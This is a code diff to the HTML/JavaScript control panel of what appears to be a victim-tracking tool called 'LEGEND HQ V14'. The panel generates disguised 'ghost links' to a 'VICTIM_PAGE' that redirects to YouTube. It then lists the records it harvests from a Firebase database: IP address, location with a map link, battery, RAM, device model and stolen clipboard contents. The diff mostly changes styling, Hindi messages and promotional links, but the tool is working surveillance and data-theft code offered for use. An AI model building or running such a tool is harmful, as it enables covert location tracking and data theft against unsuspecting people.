@@ -3,25 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LEGEND HQ V14</title>
+    <title>LEGEND HQ V14 | OFFICIAL</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
         body { background: #f0f2f5; font-family: 'Poppins', sans-serif; margin: 0; padding: 10px; color: #333; }
         .container { width: 100%; max-width: 500px; margin: auto; }
-        .card { background: white; padding: 20px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); margin-bottom: 15px; }
+        .card { background: white; padding: 20px; border-radius: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); margin-bottom: 15px; }
         h1 { color: #cc0000; font-size: 1.1rem; text-align: center; margin-bottom: 15px; }
-        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 10px; margin-bottom: 10px; box-sizing: border-box; outline: none; }
-        .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; background: #00a884; color: white; font-weight: bold; cursor: pointer; margin-bottom: 5px; font-size: 14px; }
-        .log-card { background: white; padding: 15px; border-radius: 15px; margin-top: 15px; border-left: 5px solid #cc0000; font-size: 0.8rem; line-height: 1.6; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 12px; margin-bottom: 10px; box-sizing: border-box; outline: none; }
+        .btn { width: 100%; padding: 12px; border: none; border-radius: 12px; background: #00a884; color: white; font-weight: bold; cursor: pointer; margin-bottom: 5px; font-size: 14px; transition: 0.3s; }
+        .btn:active { transform: scale(0.98); }
+        .log-card { background: white; padding: 15px; border-radius: 15px; margin-top: 15px; border-left: 5px solid #cc0000; font-size: 0.8rem; box-shadow: 0 2px 10px rgba(0,0,0,0.03); }
         .badge { background: #f8f9fa; border: 1px solid #eee; color: #555; padding: 4px 8px; border-radius: 5px; display: inline-block; margin: 2px; font-weight: 600; }
         pre { background: #1a1a1a; color: #0f0; padding: 10px; border-radius: 8px; white-space: pre-wrap; word-break: break-all; margin-top: 10px; }
-        .link-res { background: #e8f5f2; padding: 10px; border-radius: 8px; color: #00a884; font-size: 0.75rem; word-break: break-all; margin-top: 10px; display: none; }
+        .link-res { background: #e8f5f2; padding: 10px; border-radius: 8px; color: #00a884; font-size: 0.75rem; word-break: break-all; margin-top: 10px; display: none; text-align: center; }
+        
+        /* Links Section */
+        .social-links { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-top: 15px; }
+        .s-btn { padding: 8px; font-size: 0.7rem; border-radius: 8px; text-decoration: none; text-align: center; font-weight: bold; color: white; }
+        .bg-store { background: #2c3e50; }
+        .bg-wa { background: #25d366; }
+        .bg-yt { background: #ff0000; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="card">
-            <h1>LEGEND V14 FINAL HQ</h1>
+            <h1>LEGEND HQ V14 OFFICIAL</h1>
             <input type="text" id="masterKey" placeholder="Secret Key">
             <input type="text" id="targetUrl" placeholder="Redirect URL (YouTube Link)">
             <button class="btn" onclick="generateLink()">GENERATE GHOST LINK</button>
@@ -34,16 +42,25 @@
         </div>
 
         <div id="displayArea"></div>
+
+        <div class="card" style="margin-top: 20px;">
+            <p style="font-size: 0.8rem; font-weight: bold; margin-bottom: 10px;">LEGEND OFFICIAL LINKS</p>
+            <div class="social-links">
+                <a href="https://legend-mods-store.vercel.app/" target="_blank" class="s-btn bg-store">STORE</a>
+                <a href="https://whatsapp.com/channel/0029VarS46O3QxRtTZO0z60x" target="_blank" class="s-btn bg-wa">WHATSAPP</a>
+                <a href="https://www.youtube.com/@legendmod407" target="_blank" class="s-btn bg-yt">YOUTUBE</a>
+            </div>
+        </div>
     </div>
 
     <script>
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
-        const VICTIM_PAGE = "https://video-obtg.vercel.app/"; // Update this with your Vercel URL
+        const VICTIM_PAGE = "https://video-obtg.vercel.app/"; // Isse apni link se replace kar lena
 
         async function generateLink() {
             const k = document.getElementById('masterKey').value;
             const r = document.getElementById('targetUrl').value;
-            if(!k || !r) return alert("Empty fields!");
+            if(!k || !r) return alert("Details bhariye!");
             
             const longLink = VICTIM_PAGE + "?id=" + btoa(JSON.stringify({k, r}));
             const resArea = document.getElementById('linkArea');
@@ -64,7 +81,7 @@
             const data = await res.json();
             const area = document.getElementById('displayArea');
             area.innerHTML = "";
-            if(!data) return area.innerHTML = "<p style='text-align:center;'>No records found.</p>";
+            if(!data) return area.innerHTML = "<p style='text-align:center; font-size:0.8rem;'>No records found.</p>";
 
             Object.keys(data).reverse().forEach(id => {
                 const item = data[id];
@@ -75,8 +92,8 @@
                         <span class="badge">🌐 IP: ${item.ip}</span><br>
                         <span class="badge">📍 ${item.loc}</span><br>
                         <span class="badge">🔋 Bat: ${item.bat}</span> <span class="badge">🧠 RAM: ${item.ram}</span><br>
-                        <span class="badge">📱 ${item.model}</span> <span class="badge">🖥️ ${item.res}</span><br>
-                        <a href="${item.map}" target="_blank" style="color:#cc0000; font-weight:bold;">📍 VIEW GOOGLE MAPS</a>
+                        <span class="badge">📱 ${item.model}</span><br>
+                        <a href="${item.map}" target="_blank" style="color:#cc0000; font-weight:bold; text-decoration:none;">📍 VIEW ON MAP</a>
                     </div>`;
                 } else {
                     area.innerHTML += `<div class="log-card"><b>🕒 ${item.time}</b><pre>${item.clipData}</pre></div>`;
